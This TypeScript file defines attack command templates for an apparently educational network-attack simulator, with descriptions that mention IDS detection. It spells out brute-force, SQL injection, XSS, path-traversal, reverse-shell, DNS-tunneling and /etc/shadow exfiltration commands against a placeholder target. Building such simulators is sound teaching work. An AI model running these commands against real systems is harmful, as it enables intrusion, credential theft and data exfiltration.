export type AttackCategory = 'scanning' | 'brute-force' | 'web' | 'exploitation' | 'exfiltration' | 'dos'

export interface AttackCommand {
  id: string
  name: string
  tool: string
  cmd: string             // command template — {target} gets filled with destination IP
  description: string
  category: AttackCategory
  linkedScenario?: string // maps to a simulation scenario ID
}

export const ATTACK_COMMANDS: AttackCommand[] = [
  // ── Scanning ──────────────────────────────────────────────────────────────
  {
    id: 'nmap-syn',
    name: 'SYN Port Scan',
    tool: 'nmap',
    cmd: 'nmap -sS -p- --open -T4 {target}',
    description: 'Stealthy half-open TCP scan across all 65535 ports. Sends SYN, waits for SYN-ACK (open) or RST (closed), never completes the handshake. Hard to detect at low speed (-T1/-T2) but aggressive at T4.',
    category: 'scanning',
    linkedScenario: 'nmap-syn-scan',
  },
  {
    id: 'nmap-os',
    name: 'OS & Service Detection',
    tool: 'nmap',
    cmd: 'nmap -O -sV -sC {target}',
    description: 'Identifies the operating system, open service versions, and runs default NSE scripts. Generates more traffic than a plain scan and is easily detected by IDS.',
    category: 'scanning',
  },
  {
    id: 'ping-sweep',
    name: 'Ping Sweep (Host Discovery)',
    tool: 'nmap',
    cmd: 'nmap -sn {target}/24',
    description: 'ICMP echo sweep to discover which hosts are alive on the subnet before targeting them. Blocked by firewalls that drop ICMP.',
    category: 'scanning',
    linkedScenario: 'ping-sweep',
  },
  {
    id: 'udp-scan',
    name: 'UDP Port Scan',
    tool: 'nmap',
    cmd: 'nmap -sU --top-ports 200 {target}',
    description: 'Probes the top 200 UDP ports. Slower than TCP scans because closed UDP ports send back ICMP unreachable messages and open ports often give no response.',
    category: 'scanning',
  },
  {
    id: 'nikto',
    name: 'Web Vulnerability Scan',
    tool: 'nikto',
    cmd: 'nikto -h http://{target} -o nikto_report.html',
    description: 'Automated web server scanner that checks for thousands of potentially dangerous files, outdated server software, and misconfigurations. Very noisy — easy to detect.',
    category: 'scanning',
  },
  {
    id: 'gobuster',
    name: 'Directory Brute Force',
    tool: 'gobuster',
    cmd: 'gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
    description: 'Brute-forces hidden directories and files on a web server. Generates hundreds to thousands of HTTP requests. Common wordlists include SecLists and DirBuster lists.',
    category: 'scanning',
  },

  // ── Brute Force ───────────────────────────────────────────────────────────
  {
    id: 'hydra-ssh',
    name: 'SSH Brute Force',
    tool: 'hydra',
    cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4',
    description: 'Dictionary attack against SSH service. -t 4 keeps it slow to avoid lockouts. Tools like fail2ban and rate-limiting in SSH configs are the main defenses.',
    category: 'brute-force',
    linkedScenario: 'ssh-brute-force',
  },
  {
    id: 'hydra-http',
    name: 'HTTP Login Brute Force',
    tool: 'hydra',
    cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"',
    description: 'Brute forces web login forms via HTTP POST. The F= parameter defines the failure string — Hydra tries until it doesn\'t see it. CAPTCHA and account lockout are the primary defenses.',
    category: 'brute-force',
    linkedScenario: 'http-brute-force',
  },
  {
    id: 'hydra-ftp',
    name: 'FTP Brute Force',
    tool: 'hydra',
    cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{target}',
    description: 'Password guessing against FTP. FTP sends credentials in cleartext so even a single successful login is a serious risk. Very easy for IDS to detect due to repeated PASS commands.',
    category: 'brute-force',
  },
  {
    id: 'medusa-rdp',
    name: 'RDP Brute Force',
    tool: 'medusa',
    cmd: 'medusa -h {target} -u administrator -P /usr/share/wordlists/rockyou.txt -M rdp',
    description: 'Credential stuffing against Windows Remote Desktop Protocol (port 3389). RDP brute force is extremely common in the wild — NLA (Network Level Authentication) adds a layer of defense.',
    category: 'brute-force',
  },

  // ── Web Attacks ───────────────────────────────────────────────────────────
  {
    id: 'sqlmap',
    name: 'SQL Injection (sqlmap)',
    tool: 'sqlmap',
    cmd: 'sqlmap -u "http://{target}/products?id=1" --dbs --batch --level=3',
    description: 'Automated SQL injection tool that tests parameters for injection vectors and extracts database schema/data. --level=3 enables cookie and header testing. Generates a distinctive User-Agent that IDS rules catch.',
    category: 'web',
    linkedScenario: 'sql-injection',
  },
  {
    id: 'burp-sqli',
    name: 'Manual SQL Injection',
    tool: 'curl',
    cmd: "curl -s \"http://{target}/products?id=1' UNION SELECT null,username,password FROM users--\"",
    description: 'Manual UNION-based SQL injection via curl. Tests whether the application reflects query results. If column counts match you can extract arbitrary data from any table.',
    category: 'web',
    linkedScenario: 'sql-injection',
  },
  {
    id: 'xss-probe',
    name: 'XSS Probe',
    tool: 'curl',
    cmd: "curl -s \"http://{target}/search?q=<script>alert(document.cookie)</script>\"",
    description: 'Basic reflected XSS probe. If the response echoes the payload unescaped, the application is vulnerable. Modern browsers block some XSS via built-in protections, but stored XSS bypasses them.',
    category: 'web',
  },
  {
    id: 'lfi',
    name: 'Local File Inclusion',
    tool: 'curl',
    cmd: 'curl -s "http://{target}/page?file=../../../../etc/passwd"',
    description: 'Path traversal to read local files outside the web root. A successful response returns /etc/passwd contents. Can escalate to Remote Code Execution via log poisoning or /proc/self/fd.',
    category: 'web',
  },

  // ── Exploitation ──────────────────────────────────────────────────────────
  {
    id: 'msf-handler',
    name: 'Metasploit Listener',
    tool: 'msfconsole',
    cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {target}; set LPORT 4444; run"',
    description: 'Sets up a Metasploit listener for incoming reverse shell connections. After a victim executes a payload, it connects back to this handler and gives the attacker an interactive session.',
    category: 'exploitation',
  },
  {
    id: 'netcat-shell',
    name: 'Reverse Shell (netcat)',
    tool: 'nc',
    cmd: 'nc -lvnp 4444   # on attacker\n# On victim: bash -i >& /dev/tcp/{target}/4444 0>&1',
    description: 'Classic reverse shell using netcat. The victim machine connects back to the attacker\'s nc listener. Easily detected by IDS via the bash TCP redirect pattern or nc listener on non-standard ports.',
    category: 'exploitation',
  },

  // ── Exfiltration ──────────────────────────────────────────────────────────
  {
    id: 'dns-tunnel',
    name: 'DNS Tunneling (dnscat2)',
    tool: 'dnscat2',
    cmd: 'dnscat2 --dns server={target},port=53 --secret=mysecret',
    description: 'Encodes data inside DNS queries to exfiltrate data or tunnel C2 traffic through firewalls that allow outbound DNS. Generates long TXT record queries that IDS rules detect by query size and frequency.',
    category: 'exfiltration',
    linkedScenario: 'dns-tunneling',
  },
  {
    id: 'curl-exfil',
    name: 'HTTP Data Exfiltration',
    tool: 'curl',
    cmd: 'curl -X POST http://{target}/upload -F "data=@/etc/shadow" -H "Content-Type: multipart/form-data"',
    description: 'Exfiltrates sensitive files via HTTP POST to an attacker-controlled server. Blends with normal web traffic but IDS can detect large outbound POST requests from internal hosts.',
    category: 'exfiltration',
    linkedScenario: 'http-c2-beacon',
  },
]

export const ATTACK_CATEGORY_LABELS: Record<AttackCategory, string> = {
  'scanning':      'Scanning',
  'brute-force':   'Brute Force',
  'web':           'Web Attacks',
  'exploitation':  'Exploitation',
  'exfiltration':  'Exfiltration',
  'dos':           'DoS',
}

export const ATTACK_CATEGORY_COLORS: Record<AttackCategory, string> = {
  'scanning':      'text-yellow-400 bg-yellow-900/20 border-yellow-700/30',
  'brute-force':   'text-orange-400 bg-orange-900/20 border-orange-700/30',
  'web':           'text-red-400 bg-red-900/20 border-red-700/30',
  'exploitation':  'text-rose-400 bg-rose-900/20 border-rose-700/30',
  'exfiltration':  'text-pink-400 bg-pink-900/20 border-pink-700/30',
  'dos':           'text-gray-400 bg-gray-800/20 border-gray-700/30',
}
